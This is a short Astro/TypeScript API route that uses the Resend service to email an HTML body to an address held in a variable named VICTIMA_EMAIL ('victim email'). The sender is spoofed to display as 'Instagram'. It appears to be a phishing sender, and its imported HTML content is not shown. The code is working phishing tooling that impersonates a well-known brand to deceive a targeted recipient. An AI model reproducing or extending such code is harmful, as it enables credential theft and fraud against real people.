import { Resend } from "resend";
import type { APIRoute } from "astro";
import { CONTENIDO_HTML } from "../../assets/contenido";

export const POST: APIRoute = async ({ request }) => {
  const RESENDAPI = import.meta.env.PUBLIC_RESENDAPI;
  const resend = new Resend(RESENDAPI);
  const VICTIMA_EMAIL = import.meta.env.PUBLIC_VICTIMA_EMAIL;

  try {
    const response = await resend.emails.send({
      from: "Instagram <instagram@resend.dev>",
      to: [VICTIMA_EMAIL],
      subject: "Prueba desde Resend",
      html: CONTENIDO_HTML,
    });

    return new Response(JSON.stringify(response), {
      status: 200,
      headers: {
        "Content-Type": "application/json",
      },
    });
  } catch (error) {
    return new Response(
      JSON.stringify({
        success: false,
        error: (error as Error).message,
      }),
      {
        status: 500,
        headers: {
          "Content-Type": "application/json",
        },
      }
    );
  }
};
